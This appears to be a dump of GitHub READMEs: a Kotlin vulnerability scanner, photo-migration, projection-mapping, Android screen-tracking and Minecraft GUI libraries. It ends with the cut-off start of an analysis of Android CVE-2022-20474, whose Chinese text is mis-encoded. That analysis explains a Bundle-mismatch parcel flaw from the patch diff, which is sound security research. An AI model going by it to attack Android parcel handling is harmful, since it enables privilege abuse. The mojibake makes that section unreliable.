        override fun onGetLog(stringBuffer: StringBuffer) {
            Log.d(""DelvelinLog"", stringBuffer.toString())
        }
    }).scan()
}
```

### Alternative Examples

```kotlin
@Test
fun `vulnerability test`() {
    Delvelin()
        .setOutputFormat(OutputFileFormat.HTML)
        .setAutoLaunchBrowser(true) // Automatically opens the browser for HTML format
        .scan()
}

@Test
fun `vulnerability test with save dialog`() {
    Delvelin()
        .setOutputFormat(OutputFileFormat.HTML)
        .setShowSaveDialog(true) // Only applicable for HTML & JSON formats
        .scan()
}
```

![Delvelin Scan Demo](doc/save-dialog-blur_magicstudio_8tefrlgzfnr-cmprz.png?raw=true)

### Usage with Custom Detector

Below is an example of how to use Delvelin with a custom detector `ExampleCustomDetector`.

#### Step-by-step

1. Create a custom detector class like `ExampleCustomDetector`.
2. Add detection implementation in the `detect(line: String, lineNumber: Int)` and `detect(content: String)` methods.
3. Create a test function that sets the output format, adds the custom detector, and runs the scan.

#### Example Custom Detector

The following custom detector detects a specific pattern in the code. It checks each line of code and the entire content to find the pattern called `examplePattern`.

```kotlin
class ExampleCustomDetector : BaseDetector() {

    init {
        this.vulnerabilities = Vulnerabilities.UNSAFE_REFLECTION
    }

    override fun detect(line: String, lineNumber: Int) {
        // Implementation of line-based detection
        if (line.contains(""examplePattern"")) {
            val specificLocation = specificLocation(lineNumber)
            setValidVulnerability(
                specificLocation,
                ""Example finding"",
                ""Detected example pattern in the code""
            )
        }
    }

    override fun detect(content: String) {
        // Implementation of full content-based detection
        if (content.contains(""examplePattern"")) {
            val specificLocation = specificLocation(-1) // -1 to denote whole content
            setValidVulnerability(
                specificLocation,
                ""Example finding"",
                ""Detected example pattern in the full content""
            )
        }
    }
}
```

#### Using Custom Detector in Tests

Here is an example test that uses `ExampleCustomDetector` with Delvelin. This test sets the output format to HTML and adds the custom detector before running the scan.

```kotlin
@Test
fun `test using your own custom detector`() {
    Delvelin().setOutputFormat(OutputFileFormat.HTML)
        .addCustomDetector(ExampleCustomDetector())
        .scan()
}
```

### Configuration Options

| Configuration Option                         | Description                                                                                  | Default Value |
|----------------------------------------------|----------------------------------------------------------------------------------------------|---------------|
| `setOutputFormat(OutputFileFormat format)`   | Set the output format of the analysis (e.g., `HTML`, `JSON`, or `LOG`).                      | `LOG`         |
| `setAllowedExtensions(String... values)`     | Specify file extensions to include in the analysis. By default, allows `.java`, `.kt`, `.gradle`, `.kts`, and `.xml`. | `["".java"", "".kt"", "".gradle"", "".kts"", "".xml""]` |
| `setAutoLaunchBrowser(boolean value)`        | Automatically open the generated HTML report in the browser. Set to `false` to disable.      | `false`       |
| `setShowSaveDialog(boolean value)`           | Display a save dialog for HTML and JSON reports. Set to `false` to disable.                  | `false`       |
| `setLogListener(LogListener listener)`       | Set a custom listener for capturing logs during analysis (useful for Android integration).   | `null`        |
| `addCustomDetector(BaseDetector detector)`   | Add your own custom detector to identify specific patterns or vulnerabilities in the code.   | `null`        |

> **Important Notes**
> If you choose the JSON or HTML output format, you **must** use either `setAutoLaunchBrowser` or
> `setShowSaveDialog`. These methods ensure that the output is handled properly.

### <a href=""https://github.com/delvelin/example-kotlin"">See Example Project >></a>

# 4. License
This project is licensed under [MIT License](LICENSE).

# 5. Contributing
Contributions are welcome! Feel free to submit issues or pull requests for new features or improvements.

This project is still a work in progress, and your contributions are highly valuable in helping us improve and refine it.

If you find this project useful and would like to support its development, we would greatly appreciate your donations. Your generosity will go a long way in ensuring the growth and sustainability of this initiative.

---

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/F1F215NPV4)

[![Support via PayPal](https://cdn.rawgit.com/twolfson/paypal-github-button/1.0.0/dist/button.svg)](https://www.paypal.me/hanggaajisayekti/)

Thank you for your support!

### Connect
Feel free to reach out for questions, suggestions, or contributions:
- üìß Email: bazeniancode@gmail.com
- üåê [GitHub Repository](https://github.com/hangga/delvelin)
",6,1,1,,0,15.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
huangsam/photohaul,main,"# Photohaul

[![GitHub Actions Workflow Status](https://img.shields.io/github/actions/workflow/status/huangsam/photohaul/ci.yml)](https://github.com/huangsam/photohaul/actions)
[![Code Coverage](https://img.shields.io/codecov/c/github/huangsam/photohaul)](https://codecov.io/gh/huangsam/photohaul)
[![License](https://img.shields.io/github/license/huangsam/photohaul)](https://github.com/huangsam/photohaul/blob/main/LICENSE)

Effortless photo management.

- Reorganize 10K+ photos (30 GB) in seconds!
- Migrate photos locally and to the cloud (Dropbox, Google Drive)
- Customize folder structures based on date, camera, and more
- Filter photos by file type, size, and other criteria

Say goodbye to photo clutter - üëã + üöÄ

![Sunny Bunny Tidy Up](images/sunny-bunny-tidy-up.webp)

## Motivation

As an avid photographer, I use Adobe Lightroom to organize my edited SLR
photos with custom file names and folder structures. This has worked well
for me since 2015, when I started getting serious about photography.

I want to apply those same patterns to old photos, so that it is easier
for me to access my precious memories. However, I struggle to apply the
same organization to my vast collection of older photos. I cannot apply
Lightroom settings to previously exported images and writing custom
scripts seems daunting.

I also want to migrate my photos over to a NAS or a cloud provider like
Google Drive, but it involves endless rounds of manual drag-and-drop
operations. I keep thinking to myself - is there a solution out there
that ""just works"" for my workflow?

## Value

Photohaul addresses the pain points above by providing a central hub for
photographers to filter, organize, and migrate photos to local storage
and cloud services. The folder structure for photos can be based on info
such as year taken and camera make.

## Getting started

For detailed instructions: [link](USERGUIDE.md)

**Install prerequisites:**

- Java 17 or later
- Gradle 8 or later

**Build application:**

- Run `./gradlew build` in your terminal

**Configure settings:**

- Set `PathRuleSet` to filter by extension, file size, etc.
- Set `MigratorMode` to `PATH`, `DROPBOX` or `GOOGLE_DRIVE`
- Set `PhotoResolver` to adjust folder structure
- Fill config file. Refer to examples in [src/main/resources](src/main/resources)

**Run application:**

- Run `./gradlew run` in your terminal

![Migration](images/migration-step.png)

**That's it!** Sit back and rediscover your memories! üòé + üçπ + üå¥

You're welcome üôè
",0,0,1,MIT,1,4.0,0.0,1.0,1.0,4.0,0.0,-0.65,0.0
alexdmiller/shape-mapper,main,"# Shape Mapper

**[shapemapper.dev/](https://shapemapper.dev/)**

Shape Mapper is a [Processing](processing.org/) library for projection mapping.

![shape-mapper-clip](https://github.com/user-attachments/assets/9a1c0ce3-ff4e-42ab-b20c-06ef966df57a)
![cardboard](https://github.com/user-attachments/assets/59ac0c9a-4bd5-48f1-9ce9-d2512b451caa)

<img width=""700"" alt=""getting-started-2"" src=""https://github.com/user-attachments/assets/0595fd10-d813-4704-8645-975ee4f563a4"" />

> [!WARNING]  
> Shape Mapper is currently in beta. The library has been used for production installations, but has not yet been tested by the wider community, and some changes may occur based on feedback.

## üë©‚Äçüíª  Example code

Here is a minimal example showing what the library interface looks like:

``` java
import spacefiller.shapemapper.ShapeMapper;
import processing.core.PShape;

ShapeMapper mapper;
PShape shape;

void setup() {
  fullScreen(P3D);
  shape = createShape(BOX, 100, 200, 300);
  mapper = new ShapeMapper(this, shape);
}

void draw() {
  background(0);

  mapper.beginMapping();
  shape(shape);
  mapper.endMapping();
}
```

Find more examples [in the repository](examples/), packaged within the library, or on the [documentation site](https://shapemapper.dev/).

## ü™õ  Installation

1.  Ensure you have the most recent version of [Processing](https://processing.org) installed.
2.  [Download Shape Mapper v0.1.7](https://github.com/alexdmiller/shape-mapper/releases/download/v0.1.7/shapemapper.pdex).
3.  Open file on your computer; the library will be automatically installed.

## üìú  Documentation

Go to the [documentation site](https://shapemapper.dev/).

## üí™  Use cases

[Projection mapping](https://en.wikipedia.org/wiki/Projection_mapping) is the process of calibrating a digital projection to align with a three dimensional surface. The Shape Mapper library is useful if you have a 3D model of the object you want to projection map. Some example workflows:

- Create a model using 3D software such as [Blender](https://www.blender.org/), fabricate it with a 3D printer, and projection map it using Shape Mapper.
- Take precise measurements of an object and reconstruct it using 3D software such as Blender, then projection map it using Shape Mapper.
- Use Processing code to model a physical object, then projection map it using Shape Mapper (works well for simple primitives such as cubes).

If you do not have a 3D model of the object you are trying to projection map, or you are not able to create a model in code, this library will probably not be useful to you. It is still very much possible to projection map your object, though! Check out the [Keystone](https://github.com/davidbouchard/keystone) library for Processing, or software such as MadMapper, Resolume or TouchDesigner for alternative projection mapping solutions.

## ‚ú®  Features

- üßÆ Calibrate your projection by manually aligning at least 6 points; the mapping for the rest of the object will be automatically estimated.
- üó∫ Supports mapping multiple shapes at once (i.e. if you have two or more separate objects).
- üìΩ Supports multiple mappings per shape (i.e. if you have two or more projectors).
- üíæ Calibrations are saved to disk.
- üé≠ Supports face masking, which allows you to avoid projecting twice onto the same face if using more than one projector.

## ü§∑‚Äç‚ôÇÔ∏è  Non-features

Shape Mapper does not (yet) support:

- Blending between projectors
- Built in projection mapping effects (all effects must be drawn by the user with code)

## üôè  Credits & Acknowledgements

Shape Mapper is by [Alex Miller](https://alexmiller.cv/) (x: [@spacefillerart](https://x.com/spacefillerart), ig: [@space.filler.art](https://www.instagram.com/space.filler.art/), bs: [@spacefiller](https://bsky.app/profile/spacefiller.bsky.social)).

Shape Mapper is heavily inspired by and based on the [mapamok](https://github.com/YCAMInterlab/mapamok) library for [openFrameworks](https://openframeworks.cc/), originally developed by [Kyle McDonald](https://kylemcdonald.net/) as part of ProCamToolkit, co-developed by [YCAM Interlab](https://www.ycam.jp/en/aboutus/interlab/). It expands on the feature set of mapamok with multi-shape and multi-projection support.

Thanks to Rapha√´l de Courville ([@SableRaf](https://github.com/SableRaf)) and Claudine Chen ([@mingness](https://github.com/mingness)) for their help & support with Processing library development.

For camera control, Shape Mapper uses the [Peasycam library](https://mrfeinberg.com/peasycam/) by [Jonathan Feinberg](https://mrfeinberg.com).

For estimating the projection mapping matrix, Shape Mapper uses [OpenCV](https://opencv.org/).

This library was initially developed at [Gradient](https://www.gradientretreat.com/). Thanks to Avi for the week of focus.
",8,0,3,GPL-2.0,3,0.0,1.0,3.0,1.0,16.0,1.0,-4.85,0.0
hassanwasfy/iTell,main,"[![](https://jitpack.io/v/hassanwasfy/iTell.svg)](https://jitpack.io/#hassanwasfy/iTell) [![License: Personal/Non-Commercial](https://img.shields.io/badge/license-Free%20for%20Personal-orange.svg)](https://github.com/hassanwasfy/iTell#license)



# **ScreenTracker Documentation**

## **Table of Contents**
- [Overview](#overview)
- [Features](#features)
- [How to Use](#how-to-use)
- [Best Practices](#best-practices)
- [FAQ](#faq)
- [License](#license)

---

## **Overview**
`ScreenTracker` is a lightweight utility for tracking which screen (Activity or Fragment) is currently visible in your Android application. It works automatically, leveraging lifecycle callbacks to ensure seamless integration without requiring manual logging in every screen.

---

## **Features**
- **Automatic Screen Tracking:** Automatically monitors and tracks the currently active `Activity` and `Fragment`.
- **Memory Safe:** Uses `WeakReference` to ensure there are no memory leaks.
- **Analytics Integration:** Optional support for Firebase Analytics to log screen views.
- **Lightweight:** Designed for large projects with minimal performance overhead.
- **Simple API:** Provides easy access to the current screen name.
- **Framework-Compatible:** Works with XML and Jetpack Compose-based applications.

---

## **How to Use**

### **1. Gradle Configuration**
Ensure the following dependencies are added in your `settings.gradle.kts` file:

```kotlin
pluginManagement {
    repositories {
        google()
        mavenCentral()
        maven { url = uri(""https://jitpack.io"") }// Add this line 
    }
}
```

Ensure the following dependencies are added in your `build.gradle.kts` file:

```kotlin
dependencies {
    implementation (""com.github.hassanwasfy:iTell:${leatest_version}"")
}
```

### **2. Initialize in Application Class**
Add the following code to your `Application` class to start tracking activities and fragments globally:

```kotlin
class MyApplication : Application() {

   override fun onCreate() {
      super.onCreate()

      // Initialize the ScreenTracker
      //remember to add this line ONLY in DEBUG mode
        if (BuildConfig.DEBUG){
            ScreenTrackerInitializer().initialize(this)
        }
   }
}
```

### **3. Retrieve the Current Screen Name**
You can retrieve the name of the currently active screen (Activity or Fragment) using:

```kotlin
val currentScreenName = ScreenTracker.getCurrentScreenName()
Log.d(""ScreenTracker"", ""Current Screen: $currentScreenName"")
```

### **4. Optional: Firebase Integration**
If you use Firebase Analytics, initialize it in `ScreenTracker` dynamically (if available) to log screen views:

```kotlin
ScreenTracker.initializeFirebase(context)
```

---

## **Best Practices**
1. **Seamless Integration:** No need to manually invoke `ScreenTracker` in each screen; lifecycle callbacks handle tracking automatically.
2. **Memory Management:** Ensure memory safety using the built-in `WeakReference` implementation.
3. **Analytics Integration:** Use the optional Firebase Analytics integration to log screen views for better user experience monitoring.
4. **Debugging Aid:** Utilize `ScreenTracker` logs to debug navigation issues or monitor screen transitions.
5. **Scope Limitations:** Be mindful of nested fragments or dynamically added fragments. Modify callbacks if necessary to support these.

---

## **FAQ**

### **Q: Does this work with nested fragments?**
Yes, but you may need to extend the implementation to support `childFragmentManager` for nested fragments.

### **Q: Does it work with Compose?**
Yes, it works with Jetpack Compose-based activities and fragments.

### **Q: Is this library memory-intensive?**
No, the use of `WeakReference` ensures that references to activities and fragments do not cause memory leaks.

### **Q: Can I disable Firebase integration?**
Yes, Firebase Analytics is optional and can be skipped entirely if not needed.


## License

This project is licensed under a dual-license model:

1. **Personal/Non-Commercial Use**:
   - Licensed under a free, non-commercial license.
   - For personal and educational use only.
   - Commercial use needs approval.

By using this software, you agree to the terms of the appropriate license.

---

## **Conclusion**
`ScreenTracker` is an essential utility for tracking user navigation in Android apps, offering simplicity, efficiency, and flexibility. Whether for debugging or analytics, it seamlessly integrates into your app with minimal setup.

",3,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
tttsaurus/Ingame-Info-Reborn,master,"This is a spiritual successor of [InGame-Info-XML](https://github.com/Lunatrius/InGame-Info-XML), **not a fork**.

If you like this project, don't forget to give it a star‚≠ê!

Currently WIP

Suggestions/PRs are welcome

## Overview
This is a library mod that helps you to create in-game overlaid (or focused) gui with ease.

![Snipaste_2025-01-12_12-53-07](https://github.com/user-attachments/assets/581f0727-bba8-4ff5-9780-8fdbfaf587fd)

## Todo List / Features
<details>
<summary>Click to expand</summary>

https://trello.com/b/MTLHeyGn/ingameinfo

- Approximate Model-View-ViewModel pattern (‚úî)
- Add framebuffer to the rendering life cycle (‚úî)
- Introduce a custom gui container (‚úî)
- Maintain a list of custom gui containers (‚úî)
- A gui container can be ingame-overlaid/focused (switchable) (‚úî)
- Introduce feature-rich gui layout
  - Pivot (‚úî)
  - Alignment (‚úî)
  - Padding (‚úî)
  - Horizontal Group (stack elements horizontally) (‚úî)
  - Vertical Group (stack elements vertically) (‚úî)
  - Sized Group (‚úî)
  - Nesting Groups (group in group) (‚úî)
  - Adaptive Group (fit elements into it adaptively)
  - Foldout Group
- Add controls like text, button, input field, etc.
  - Text (‚úî)
  - Sliding Text (‚úî)
  - Anim Text (‚úî)
  - Simple Button (‚úî)
  - Checkbox
  - Input Field
  - Image
  - Url Image (‚úî)
  - GIF
  - Slide Bar
  - Progress Bar (‚úî)
  - Draggable
- Introduce modular animation options for controls (WIP)
- Add crt support (‚úî)
- Ingame spotify support (‚úî)

</details>

## About Spotify Overlay
<details>
<summary>Click to expand</summary>

Also under early stage of development

Version Requirement: >= v1.0.0-b2
- It depends on the Spotify Web API, so it only works when you are connected to the Internet
- You have to register your own spotify app first and then input the client id & secret to the config file to allow the Web API to function ([About Spotify App](https://developer.spotify.com/documentation/web-api/concepts/apps). Btw, Redirect URI should be set to http://localhost:8888 for this mod to listen)<br><br>Specific spotify app config is as follows
![Snipaste_2025-01-08_10-58-25](https://github.com/user-attachments/assets/241d10bf-3309-4ac1-9bdc-b1f33946b455)

- Input the command `#spotify-oauth` to the chat to authorize your spotify app
- After you finished the authentication, input the command `#spotify-gui true` while you're listening to a track on Spotify to open the gui overlay. `#spotify-gui false` for closing ofc
- You can always run `#spotify-gui true` again to refresh
- Album image loading could be slow
- You no longer need to run `#spotify-oauth` for the next launch and so on, but you should run `#spotify-oauth` to refresh if you encountered any issues
- Run `#spotify-gui-edit` to switch to another layout at runtime

![Snipaste_2025-01-07_21-27-57](https://github.com/user-attachments/assets/4324f4e5-481a-4a72-8658-6b65f876809c)

</details>

## Latest Build
In case you want to use the latest action build
- Go to [GitHub Actions](https://github.com/tttsaurus/Ingame-Info-Reborn/actions)
- Click on the latest workflow
- Scroll down to the bottom and download the `Artifacts`
- Unzip and `ingameinfo-[version].jar` is the mod file

## How to use
API is stabilizing.
Here's an easy example under v1.0.0-b5.

`./config/ingameinfo/test.ixml`
```xml
<HorizontalGroup>
    <Text uid = ""myUid"">
</Group>
```
`TestView.java`
```java
public class TestView extends View
{
    @Override
    public String getIxmlFileName() { return ""test""; }
}
```
`TestViewModel.java`
```java
public class TestViewModel extends ViewModel<TestView>
{
    @Reactive(targetUid = ""myUid"", property = ""text"", initiativeSync = true)
    public ReactiveObject<String> myUidText = new ReactiveObject<String>(){};

    @Override
    public void start()
    {
        EventCenter.igiGuiFpsEvent.addListener((fixedFps, renderFps) ->
        {
            myUidText.set(""Fixed FPS: "" + fixedFps + "", Render FPS: "" + renderFps);
        });
    }
}
```
```java
@SubscribeEvent
public static void onMvvmRegister(MvvmRegisterEvent event)
{
    MvvmRegistry.autoRegister(""test"", TestViewModel.class);
}
```
```java
IgiGuiManager.openGui(""test"");
```
The default alignment and pivot are the top-left corner.
![Snipaste_2025-01-22_00-20-57](https://github.com/user-attachments/assets/ee9818ca-eee7-4ff2-9825-00a8cd3c1cc4)


Crt version is as follows (install ProbeZS and ZS IntelliSense for more api details)
```zenscript
#loader preinit

import mods.ingameinfo.mvvm.ViewModel;
import mods.ingameinfo.mvvm.View;
import mods.ingameinfo.mvvm.Mvvm;
import mods.ingameinfo.Types;
import mods.ingameinfo.igievent.EventCenter;

Mvvm.define(""test"");

View.setIxmlFileName(""test"");

var myUidText = ViewModel.registerReactiveObject(""myUidText"", Types.String, ""myUid"", ""text"", true);

ViewModel.setStartAction(function()
{
    EventCenter.addIgiGuiFpsEventListener(function(fixedFps as int, renderFps as int)
    {
        myUidText.set(""Fixed FPS: "" ~ fixedFps ~ "", Render FPS: "" ~ renderFps);
    });
});
```
```zenscript
import mods.ingameinfo.gui.IgiGuiManager;
import mods.ingameinfo.event.IgiGuiInitEvent;

events.onIgiGuiInit(function(event as IgiGuiInitEvent)
{
    IgiGuiManager.openGui(""test"");
});
```

Extra java example:
- [TemplateView](https://github.com/tttsaurus/Ingame-Info-Reborn/blob/master/src/main/java/com/tttsaurus/ingameinfo/common/impl/mvvm/TemplateView.java)
- [TemplateViewModel](https://github.com/tttsaurus/Ingame-Info-Reborn/blob/master/src/main/java/com/tttsaurus/ingameinfo/common/impl/mvvm/TemplateViewModel.java)

Extra Tips:
- Go to `./logs/latest.log`
- Find
  ```
  [00:18:06] [Client thread/INFO] [ingameinfo]: In-Game Info Reborn starts initializing.
  [00:18:06] [Client thread/INFO] [ingameinfo]: Reflection setup finished.
  [00:18:06] [Client thread/INFO] [ingameinfo]: Network setup finished.
  [00:18:06] [Client thread/INFO] [ingameinfo]: 
  [00:18:06] [Client thread/INFO] [ingameinfo]: Registered usable elements: 
  [00:18:06] [Client thread/INFO] [ingameinfo]:   - UrlImage
  [00:18:06] [Client thread/INFO] [ingameinfo]:   - SlidingText
  [00:18:06] [Client thread/INFO] [ingameinfo]:   - Text
  [00:18:06] [Client thread/INFO] [ingameinfo]:   - VerticalGroup
  [00:18:06] [Client thread/INFO] [ingameinfo]:   - AnimText
  [00:18:06] [Client thread/INFO] [ingameinfo]:   - SimpleButton
  [00:18:06] [Client thread/INFO] [ingameinfo]:   - EmptyBlock
  [00:18:06] [Client thread/INFO] [ingameinfo]:   - SizedGroup
  [00:18:06] [Client thread/INFO] [ingameinfo]:   - HorizontalGroup
  [00:18:06] [Client thread/INFO] [ingameinfo]:   - ProgressBar
  [00:18:06] [Client thread/INFO] [ingameinfo]: 
  [00:18:06] [Client thread/INFO] [ingameinfo]: Element type: Sized extends Element
  [00:18:06] [Client thread/INFO] [ingameinfo]: - With style properties:
  [00:18:06] [Client thread/INFO] [ingameinfo]:   - [float] width (with deserializer: BuiltinTypesDeserializer)
  [00:18:06] [Client thread/INFO] [ingameinfo]:     - Setter callback pre: nonNegativeFloatValidation
  [00:18:06] [Client thread/INFO] [ingameinfo]:     - Setter callback post: requestReCalc
  [00:18:06] [Client thread/INFO] [ingameinfo]:   - [float] height (with deserializer: BuiltinTypesDeserializer)
  [00:18:06] [Client thread/INFO] [ingameinfo]:     - Setter callback pre: nonNegativeFloatValidation
  [00:18:06] [Client thread/INFO] [ingameinfo]:     - Setter callback post: requestReCalc
  ...
  ```
- Then you'll know what style properties each element has
- As a result, you can write your `ixml` file with ease

## Credits
- Created using [GregTechCEu's Buildscripts](https://github.com/GregTechCEu/Buildscripts)
- Inspired by [InGame-Info-XML](https://github.com/Lunatrius/InGame-Info-XML)
",6,0,1,MIT,1,3.0,0.0,2.0,1.0,3.0,0.0,-0.65,0.0
cxxsheng/CVE-2022-20474,main,"

# CVE-2022-20474ÂàÜÊûê‚Äî‚ÄîLazyValue‰∏ãÁöÑSelf-changed Bundle

### ÂâçË®Ä
Ê∏©È¶®ÊèêÁ§∫ÔºåÈòÖËØªÊú¨ÊñáÂâçÔºåÂ∫îÂΩìÂØπBundle MismatchÁõ∏ÂÖ≥ÊºèÊ¥ûÊúâÂàùÊ≠•‰∫ÜËß£Ôºå‰ª•‰∏ãÂèÇËÄÉËµÑÊñôÂÅáÂ¶ÇÊÇ®ËøòÊ≤°ÊúâËØªËøáÔºåÂª∫ËÆÆÂÖàÈòÖËØª‰∏Ä‰∏ãÔºö

1. [BundleÈ£éÊ∞¥‚Äî‚ÄîAndroidÂ∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñ‰∏çÂåπÈÖçÊºèÊ¥ûËØ¶Ëß£](https://xz.aliyun.com/t/2364?time__1311=n4%2Bxni0%3DG%3DDti%3DGCDu7DlxG2fImHw4qiIYwE%3Dx)ÔºöÁªèÂÖ∏ÁöÑÂÖ•Èó®Á∫ßÂà´ÊïôÁ®ã„ÄÇ
2. [Android ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÊîªÈò≤Âè≤ËØù](https://evilpan.com/2023/02/18/parcel-bugs/)ÔºöÂæàÂ•ΩÁöÑÊÄªÁªìÊÄßÊñáÁ´†„ÄÇ
3. [TheLastBundleMismatch](https://github.com/michalbednarski/TheLastBundleMismatch)ÔºöÁ¨¨‰∏ÄÁØáLazyValueÊ®°Âºè‰∏ãÁöÑBundle MismatchÊñáÁ´†„ÄÇ



### ËÉåÊôØ

ÊúÄËøëÊ≠£‰ªîÁªÜÂ≠¶‰π†[michalbednarski](https://github.com/michalbednarski)ÁöÑ[LeakValueÊñáÁ´†](https://github.com/michalbednarski/LeakValue)„ÄÇÂú®‰∏éCanyieËÆ®ËÆ∫ÁöÑÊó∂ÂÄôÔºå‰ªñËØ¥Âú®ËøôÁØáÊñáÁ´†‰∏≠ËøòÊèêÂà∞‰∫Ü‰∏ÄÁßçÂú®LazyValueÂú∫ÊôØ‰∏ãSelf-changing BundleÁöÑÊÉÖÂÜµÔºåÁÑ∂ÂêéÊàëÂ∞±ÂéªÁøªÊâæÂéüÊñáÔºåÊûúÁúüÊúâËøô‰πà‰∏ÄÊÆµÔºåËÄåÊàëÂú®ËØªMichalÁöÑÊñáÁ´†ÁöÑÊó∂ÂÄôÁõ¥Êé•ÊºèÊéâ‰∫Ü„ÄÇÂéüÊñá‰∏≠Â¶Ç‰∏ãËØ¥Âà∞Ôºö

> (Also `LazyValue` with negative length specified can be used (without using other bugs described in this writeup) to create self-changing `Bundle`, the thing `LazyValue` was created to eliminate. But that is another story (and separately reported to Google), in this exploit I'm aiming for more)

MichalÊåáÁöÑÂ∫îËØ•Â∞±ÊòØCVE-2022-20474 ([bulletin](https://source.android.com/docs/security/bulletin/2022-12-01#framework), [patch](https://android.googlesource.com/platform/frameworks/base/+/569c3023f839bca077cd3cccef0a3bef9c31af63^!/))ÔºåÊàëÁûÖ‰∫Ü‰∏ÄÁúºpatchÔºå‰ΩÜÊòØË°•‰∏ÅÈìæÊé•‰∏≠ÂáΩÊï∞Âπ∂Ê≤°ÊúâÂæàÂÆåÊï¥ÔºåË°•ÂÖ®ÂÆÉ‰πãÂêéÂÜç‰ªîÁªÜÁúã‰∏Ä‰∏ãÔºö

```diff
@@ -4388,6 +4388,9 @@
    public Object readLazyValue(@Nullable ClassLoader loader) {
         int start = dataPosition();
         int type = readInt();
         if (isLengthPrefixed(type)) {
             int objectLength = readInt();
+            if (objectLength < 0) {
+                return null;
+            }
             int end = MathUtils.addOrThrow(dataPosition(), objectLength);
             int valueLength = end - start;
             setDataPosition(end);
             return new LazyValue(this, start, valueLength, type, loader);
         } else {
            return readValue(type, loader, /* clazz */ null);
         }
    }             
```

‰ª£Á†Å‰∏≠ÁöÑ`objectLength`Â∞±ÊòØ`LazyValue`‰∏≠ÁöÑ`length`Ôºå‰∫ãÂÆû‰∏äËøôÂè™ÊòØ`LazyValue`‰∏≠ÂåÖÂê´ÁöÑÂèØÂèòÂØπË±°ÁöÑÈïøÂ∫¶ÔºåËÄåÊï¥‰∏™`LazyValue`ÁöÑÈïøÂ∫¶Â∫îËØ•ÊòØ`mLength`Â≠óÊÆµÊù•ÊéßÂà∂ÔºåÂç≥‰ª£Á†Å‰∏≠ÁöÑ`valueLength`ÔºåÂÖ∂Âú®`LazyValue`ÁöÑÊûÑÈÄ†ÂáΩÊï∞‰∏≠ÔºåÂ∞ÜÂÄº‰º†ÈÄíÁªô‰∫Ü`mLength`„ÄÇ

ËÆ©Êàë‰ª¨Âú®ÂØπÁÖß‰∏Ä‰∏ã`LazyValue`ÁöÑÂ∏ÉÂ±ÄÊ†ºÂºèÂ¶Ç‰∏ãÔºö

```java
       /**
         *                      |   4B   |   4B   |
         * mSource = Parcel{... |  type  | length | object | ...}
         *                      a        b        c        d
         * length = d - c
         * mPosition = a
         * mLength = d - a
         */
```

Âü∫‰∫é‰∏äËø∞ÁöÑÂÜÖÂÆπÔºåÊàë‰ª¨ÂèØ‰ª•ÂæóÂà∞Â¶Ç‰∏ã**‰∫ãÂÆû**Ôºö

1. `mLength`‰ª£Ë°®Êï¥‰∏™`LazyValue`ÁöÑÈïøÂ∫¶Ôºå`mLength` = `objectLength` + 8Â≠óËäÇ„ÄÇ
2. `objectLength`Â∫îËØ•Â§ß‰∫éÁ≠â‰∫é0„ÄÇ
3. `LazyValue`ÂØπË±°‰∏≠Âè™‰øùÂ≠ò‰∫Ü`mLength`ÔºåËÄåÊ≤°‰øùÂ≠ò`objectLength`ÔºåÂõ†‰∏∫`LazyValue`‰ΩúÂÜÖÂ≠òÊã∑Ë¥ùÁöÑÊó∂ÂÄôÊòØÂü∫‰∫éÊï¥‰∏™ÂØπË±°Êù•ÂÅöÊã∑Ë¥ùÁöÑ„ÄÇ
4. ËØªÂÆå‰πãÂêéÁöÑÊåáÈíàÊòØÂâçÁßªÁöÑÔºåÂèØËÉΩËøò‰ºöÂÜçËØª‰∏ÄÈÅç`LazyValue`

ÁÑ∂ÂêéÂë¢ÔºåÁªèËøáÊ∑±ÊÄùÁÜüËôëÔºåÊàë‰ª¨‰∏ÄËá¥ËÆ§‰∏∫ÔºåËøô‰∫õ‰∫ãÂÆûÊ≤°ÔºÅÂï•ÔºÅXÔºÅÁî®ÔºÅÂõ†‰∏∫Âü∫‰∫é‰∏äÈù¢ÁöÑ‰∫ãÂÆûÔºå‰πüÂè™ËÉΩÂú®readÁöÑÊó∂ÂÄô‰øÆÊîπ‰∏ÄÊ¨°ÔºåËÄåÊàë‰ª¨Áü•ÈÅì`Self-changed Bundle`ÁöÑÊ†∏ÂøÉÊÄùÊÉ≥ÊòØreadÂÆåÊàêÂêéÂÜç‰øÆÊîπÔºåÊâçËÉΩÁªïËøáÂÆâÂÖ®Ê£ÄÊü•„ÄÇ

Ê≠£ÂΩìÊàë‰ª¨ÂáÜÂ§áÊîæÂºÉÁöÑÊó∂ÂÄôÔºåÁ™ÅÁÑ∂ÂèëÁé∞‰∫ÜË°•‰∏ÅÁöÑÊèèËø∞‰∏≠Êúâ‰∏Ä‰∫õÁªÜËäÇÔºö

>Addresses a security vulnerability where a (-8) length object would
>cause dataPosition to be reset back to the statt of the value, and be
>re-read again.

### ÂºÇÂ∏∏ÁöÑ`objectLength`

ÂÖ∂‰∏≠ÊèêÂà∞Ôºå`objectLength`‰∏∫-8ÁöÑÊó∂ÂÄôÔºå‰ºöÂ≠òÂú®‰∏Ä‰∫õÈóÆÈ¢òÔºåËøô‰∏™Áªô‰∫ÜÊàë‰ª¨‰∏Ä‰∫õÈ¢ùÂ§ñÁöÑÂêØÁ§∫„ÄÇÊ≠§Êó∂`LazyValue`ËøòËÉΩÊ≠£Â∏∏ÁöÑapplyÂêóÔºü

```java
        @Override
        public Object apply(@Nullable Class<?> clazz, @Nullable Class<?>[] itemTypes) {
            Parcel source = mSource;
            if (source != null) {
                synchronized (source) {
                    // Check mSource != null guarantees callers won't ever see different objects.
                    if (mSource != null) {
                        int restore = source.dataPosition();
                        try {
                            source.setDataPosition(mPosition);
                            mObject = source.readValue(mLoader, clazz, itemTypes);
                        } finally {
                            source.setDataPosition(restore);
                        }
                        mSource = null;
                    }
                }
            }
            return mObject;
        }

  	/**
     * @see #readValue(int, ClassLoader, Class, Class[])
     */
    @Nullable
    private <T> T readValue(@Nullable ClassLoader loader, @Nullable Class<T> clazz,
            @Nullable Class<?>... itemTypes) {
        int type = readInt();
        final T object;
        if (isLengthPrefixed(type)) {
            int length = readInt();
            int start = dataPosition();
            object = readValue(type, loader, clazz, itemTypes);
            int actual = dataPosition() - start;
            if (actual != length) {
                Slog.wtfStack(TAG,
                        ""Unparcelling of "" + object + "" of type "" + Parcel.valueTypeToString(type)
                                + ""  consumed "" + actual + "" bytes, but "" + length + "" expected."");
            }
        } else {
